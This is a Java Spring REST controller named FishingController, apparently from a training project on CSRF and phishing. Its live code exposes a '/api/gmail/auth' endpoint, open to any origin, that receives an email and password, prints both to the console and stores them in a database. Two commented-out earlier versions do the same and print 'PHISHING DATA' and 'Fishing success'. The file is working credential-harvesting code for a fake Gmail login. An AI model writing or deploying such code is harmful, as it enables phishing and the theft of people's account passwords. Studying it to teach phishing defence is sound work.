package kz.bitlab.restcsrfproject.controllers;

import kz.bitlab.restcsrfproject.entities.User;
import kz.bitlab.restcsrfproject.repositories.UserRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

@CrossOrigin(origins = "*")
@RestController
@RequestMapping("/api/gmail")
public class FishingController {

    @Autowired
    private UserRepository userRepository;

    @PostMapping("/auth")
    public String auth(@RequestBody User user){

        System.out.println(user.getEmail());
        System.out.println(user.getPassword());

        userRepository.save(user);

        return "saved";
    }
}














//package kz.bitlab.restcsrfproject.controllers;
//
//import kz.bitlab.restcsrfproject.entities.User;
//import org.springframework.web.bind.annotation.*;
//
//@CrossOrigin(origins = "*")
//@RestController
//@RequestMapping("/api/gmail")
//public class FishingController {
//
//    @PostMapping("/auth")
//    public String auth(@RequestBody User user){
//        System.out.println("=== PHISHING DATA ===");
//        System.out.println(user.getEmail());
//        System.out.println(user.getPassword());
//        return "Fishing success";
//    }
//}



//package kz.bitlab.restcsrfproject.controllers;
//
//import org.springframework.web.bind.annotation.*;
//import kz.bitlab.restcsrfproject.entities.User;
//
//@CrossOrigin(origins = "*")
//@RestController
//@RequestMapping("/api/gmail")
//public class FishingController {
//    @PostMapping("/auth")
//    public String auth(@RequestBody User user){
//        System.out.println(user.getEmail());
//        System.out.println(user.getPassword());
//        return "Fishing success";
//
//    }
//}
